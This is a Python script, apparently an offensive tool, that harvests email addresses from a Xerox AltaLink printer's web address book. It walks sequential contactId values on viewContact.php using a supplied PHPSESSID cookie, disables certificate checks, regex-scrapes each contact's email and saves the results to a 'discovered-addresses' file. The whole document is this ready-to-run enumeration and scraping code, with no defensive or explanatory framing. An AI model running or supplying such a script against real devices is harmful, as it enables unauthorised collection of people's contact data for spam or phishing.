import argparse
import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Create argument parser
parser = argparse.ArgumentParser(description="Retrieve email addresses from Xerox AltaLink printer's Address Book.")
parser.add_argument("-ip", metavar="IP", help="IP address of the Xerox printer")
parser.add_argument("-n", metavar="NUM_CONTACTS", type=int, help="Number of contacts in the Address Book")
parser.add_argument("-c", metavar="PHPSESSID", help="PHPSESSID cookie value")
args = parser.parse_args()

# Get user input if arguments are not provided
ip_address = args.ip or input("Enter the IP address of the Xerox printer: ")
num_contacts = args.n or int(input("Enter the number of contacts in the Address Book: "))
phpsessid = args.c or input("Enter the PHPSESSID cookie value: ")

# Set the URL and headers
url = "/addressbook/viewContact.php"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Cookie": f"PHPSESSID={phpsessid}"
}

# Initialize variables
email_list = []

# Iterate through contacts
for contact_id in range(num_contacts):
    # Set the URL with contactId parameter
    contact_url = f"https://{ip_address}{url}?contactId={contact_id}"

    # Make the HTTPS request
    response = requests.get(contact_url, headers=headers, verify=False)

    # Extract email address from response
    pattern = r"<h6>Email</h6>\s*<span class=\"subText\">(.*?)</span>"
    matches = re.findall(pattern, response.text)

    if matches:
        email_list.extend(matches)

# Save discovered email addresses to a text file
output_file = "discovered-addresses.txt"
with open(output_file, "w") as file:
    for email in email_list:
        file.write(email + "\n")

print(f"Email addresses saved to '{output_file}'")
print(f"Number of retrieved email addresses: {len(email_list)}")

